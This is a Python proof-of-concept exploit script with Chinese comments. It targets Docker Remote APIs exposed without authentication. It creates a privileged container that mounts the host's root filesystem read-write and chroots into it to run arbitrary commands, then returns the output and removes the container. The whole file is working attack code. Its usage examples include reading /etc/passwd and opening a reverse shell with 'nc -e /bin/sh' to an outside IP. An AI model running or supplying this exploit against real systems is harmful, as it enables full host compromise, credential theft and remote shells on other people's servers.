#!/usr/bin/env python3
"""
Docker Remote API 未授权访问导致远程代码执行 PoC
用法：
    python3 docker_unauth_rce.py <目标IP> [端口] [命令]
示例：
    python3 docker_unauth_rce.py 192.168.1.100 2375 "id"
    python3 docker_unauth_rce.py 192.168.1.100 2375 "cat /etc/passwd"
    python3 docker_unauth_rce.py 192.168.1.100 2375 "nc -e /bin/sh 10.0.0.1 4444"
"""

import sys
import json
import time
import requests

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings()


class DockerAPIClient:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def _request(self, method, path, **kwargs):
        url = f'{self.base_url}/{path.lstrip("/")}'
        kwargs.setdefault('timeout', 30)
        kwargs.setdefault('verify', False)
        resp = self.session.request(method, url, **kwargs)
        return resp

    def version(self):
        """测试 API 连通性"""
        r = self._request('GET', '/version')
        if r.status_code == 200:
            data = r.json()
            print(f'[+] 成功连接到 Docker API，版本: {data.get("Version", "未知")}')
            return True
        else:
            print(f'[-] 无法访问 Docker API，状态码: {r.status_code}')
            return False

    def image_exists(self, image):
        """检查镜像是否存在（本地）"""
        # 简单方式：通过 inspect 检查，若 404 则不存在
        r = self._request('GET', f'/images/{image}/json')
        return r.status_code == 200

    def pull_image(self, image):
        """拉取镜像（流式响应）"""
        print(f'[*] 正在拉取镜像 {image}，请稍候...')
        r = self._request('POST', f'/images/create?fromImage={image.split(":")[0]}&tag={image.split(":")[1] if ":" in image else "latest"}', stream=True)
        if r.status_code != 200:
            print(f'[-] 拉取镜像失败，状态码: {r.status_code}')
            return False
        # 简单地读取完流，以完成拉取
        for _ in r.iter_content(chunk_size=1024):
            pass
        print('[+] 镜像拉取完成')
        return True

    def create_container(self, image, command):
        """创建用于执行命令的容器"""
        # 宿主机根目录挂载到 /rootfs，并 chroot 执行命令
        container_config = {
            "Image": image,
            "Cmd": ["chroot", "/rootfs", "/bin/sh", "-c", command],
            "AttachStdout": True,
            "AttachStderr": True,
            "HostConfig": {
                "Privileged": True,
                "Binds": ["/:/rootfs:rw"]
            }
        }
        r = self._request('POST', '/containers/create', json=container_config)
        if r.status_code == 201:
            container_id = r.json()['Id']
            print(f'[+] 容器创建成功: {container_id}')
            return container_id
        else:
            print(f'[-] 容器创建失败: {r.status_code} - {r.text[:200]}')
            return None

    def start_container(self, container_id):
        """启动容器"""
        r = self._request('POST', f'/containers/{container_id}/start')
        if r.status_code == 204:
            return True
        else:
            print(f'[-] 启动容器失败: {r.status_code}')
            return False

    def get_logs(self, container_id):
        """获取容器日志（stdout/stderr）"""
        r = self._request('GET', f'/containers/{container_id}/logs?stdout=1&stderr=1')
        if r.status_code == 200:
            return r.content  # 原始二进制数据，可能包含头部
        else:
            print(f'[-] 获取日志失败: {r.status_code}')
            return None

    def wait_container(self, container_id):
        """等待容器退出"""
        r = self._request('POST', f'/containers/{container_id}/wait')
        if r.status_code == 200:
            return r.json().get('StatusCode', -1)
        return -1

    def remove_container(self, container_id):
        """强制删除容器"""
        r = self._request('DELETE', f'/containers/{container_id}?force=true')
        return r.status_code == 204

    def execute_command(self, command, image='alpine:latest'):
        """完整执行流程：检查镜像 → 创建 → 启动 → 等待 → 获取日志 → 删除"""
        # 确保镜像存在
        if not self.image_exists(image):
            print(f'[*] 镜像 {image} 不存在，尝试拉取...')
            if not self.pull_image(image):
                return False, None

        # 创建容器
        cid = self.create_container(image, command)
        if not cid:
            return False, None

        # 启动容器
        if not self.start_container(cid):
            self.remove_container(cid)
            return False, None

        # 等待执行完成
        exit_code = self.wait_container(cid)

        # 获取日志
        logs = self.get_logs(cid)
        if logs:
            # Docker 日志流格式：前 8 字节为流类型（1=stdout, 2=stderr）和长度，简单处理：跳过头部
            # 这里使用更可靠的方式：通过日志流的 multiplex 格式解析，或直接解码尝试
            output = self._parse_logs(logs)
        else:
            output = b''

        # 清理容器
        self.remove_container(cid)
        return True, output.decode('utf-8', errors='replace')

    @staticmethod
    def _parse_logs(raw_data):
        """解析 Docker 日志 multiplex 流，提取实际内容"""
        output = bytearray()
        i = 0
        while i < len(raw_data):
            if i + 8 > len(raw_data):
                break
            # 流类型: 1=stdout, 2=stderr (字节0)
            # 字节 4-7: 长度（大端）
            length = int.from_bytes(raw_data[i+4:i+8], 'big')
            if i + 8 + length > len(raw_data):
                length = len(raw_data) - i - 8
            output.extend(raw_data[i+8:i+8+length])
            i += 8 + length
        return bytes(output)


def main():
    if len(sys.argv) < 2:
        print(f'用法: {sys.argv[0]} <目标IP> [端口] [命令]')
        print(f'示例: {sys.argv[0]} 192.168.1.100 2375 "id"')
        print(f'      {sys.argv[0]} 192.168.1.100 2375 "cat /etc/passwd"')
        sys.exit(1)

    host = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else '2375'
    command = sys.argv[3] if len(sys.argv) > 3 else 'id'

    target = f'http://{host}:{port}'
    print(f'[*] 目标: {target}')
    print(f'[*] 执行命令: {command}')

    client = DockerAPIClient(target)

    # 检查 API 连通性
    if not client.version():
        sys.exit(1)

    # 执行命令
    success, output = client.execute_command(command)
    if success:
        print('[+] 命令执行成功，输出如下：')
        print(output.strip())
    else:
        print('[-] 利用失败，请检查目标配置或命令')


if __name__ == '__main__':
    main()